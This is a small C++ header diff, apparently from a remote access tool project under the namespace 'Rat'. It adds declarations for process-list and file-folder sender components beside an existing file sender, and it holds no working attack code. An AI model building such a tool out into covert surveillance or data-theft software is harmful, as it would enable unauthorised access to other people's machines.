@@ -8,6 +8,8 @@
 #include <thread>
 #include "NetworkManager.hpp"
 #include "FileSender.hpp"
+#include "ProcessSender.hpp"
+#include "FileFolderSender.hpp"
 #include "Packet.pb.h"
 
 namespace Rat 
@@ -42,6 +44,8 @@ namespace Rat
         // ClientSecurity security_;
         std::thread input_thread_;
         std::shared_ptr<FileSender> current_file_sender_;
+        std::shared_ptr<ProcessSender> current_process_sender_;
+        std::shared_ptr<FileFolderSender> current_file_folder_sender_;
     };
 
 } // namespace Rat
